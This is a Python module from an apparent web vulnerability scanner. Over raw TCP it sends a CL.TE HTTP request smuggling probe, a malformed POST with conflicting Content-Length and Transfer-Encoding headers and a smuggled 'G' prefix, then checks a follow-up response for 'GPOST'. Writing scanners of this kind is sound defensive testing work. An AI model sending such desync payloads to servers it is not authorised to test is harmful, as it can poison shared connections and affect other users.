"""HTTP request smuggling probe using raw asyncio streams.

Playwright cannot send malformed HTTP — raw TCP is required for CL.TE / TE.CL
probes. This module opens a raw connection and detects whether the server is
vulnerable by checking whether a smuggled prefix (e.g. "GPOST") surfaces in
a subsequent response.
"""
from __future__ import annotations

import asyncio
from dataclasses import dataclass

from log.audit import log_step


@dataclass
class SmugglingResult:
    """Result of an HTTP request smuggling probe.

    Attributes:
        vulnerable: True if smuggling vulnerability detected.
        variant: Which variant triggered ("CL.TE" or "TE.CL"), or "" if none.
        evidence: Human-readable evidence string.
        error: Error message if probe failed, else None.
    """
    vulnerable: bool = False
    variant: str = ""
    evidence: str = ""
    error: str | None = None


async def _send_raw(
    host: str,
    port: int,
    data: bytes,
    timeout: float,
) -> str:
    """Open raw TCP connection, send data, read response.

    Args:
        host: Target hostname.
        port: TCP port.
        data: Raw bytes to transmit.
        timeout: Read timeout in seconds.

    Returns:
        Decoded response string (best-effort, ignores decode errors).
    """
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=timeout,
        )
        writer.write(data)
        await writer.drain()
        response = await asyncio.wait_for(reader.read(4096), timeout=timeout)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:  # noqa: BLE001
            pass
        return response.decode("utf-8", errors="replace")
    except (ConnectionRefusedError, OSError) as exc:
        raise ConnectionRefusedError(str(exc)) from exc
    except asyncio.TimeoutError:
        return ""


async def probe_smuggling(
    host: str,
    port: int = 80,
    path: str = "/",
    timeout: float = 10.0,
) -> SmugglingResult:
    """Probe for HTTP request smuggling via raw TCP.

    Sends CL.TE probe: Content-Length disagrees with Transfer-Encoding.
    If the server desynchronises and exposes a smuggled "GPOST" prefix in a
    follow-up response, the host is vulnerable.

    Args:
        host: Target hostname or IP.
        port: TCP port (default 80).
        path: URL path to probe (default "/").
        timeout: Per-probe timeout in seconds.

    Returns:
        SmugglingResult indicating whether smuggling was detected.
    """
    log_step("browser.probe.smuggling", host=host, port=port, path=path)

    # CL.TE probe: front-end uses Content-Length, back-end uses Transfer-Encoding
    # The "G" prefix is the start of a smuggled "GPOST" request.
    cl_te_request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    ).encode()

    # Follow-up normal request to detect if "GPOST" surfaces
    normal_request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    try:
        response1 = await _send_raw(host, port, cl_te_request, timeout)
        response2 = await _send_raw(host, port, normal_request, timeout)
        combined = (response1 + response2).upper()
        if "GPOST" in combined or (
            "400" in response2 and "CHUNKED" in combined
        ):
            return SmugglingResult(
                vulnerable=True,
                variant="CL.TE",
                evidence=f"Smuggled 'GPOST' detected in response: {response2[:200]}",
            )
        return SmugglingResult(vulnerable=False)
    except ConnectionRefusedError as exc:
        return SmugglingResult(error=f"Connection refused: {exc}")
    except Exception as exc:  # noqa: BLE001
        return SmugglingResult(error=f"Probe error: {exc}")
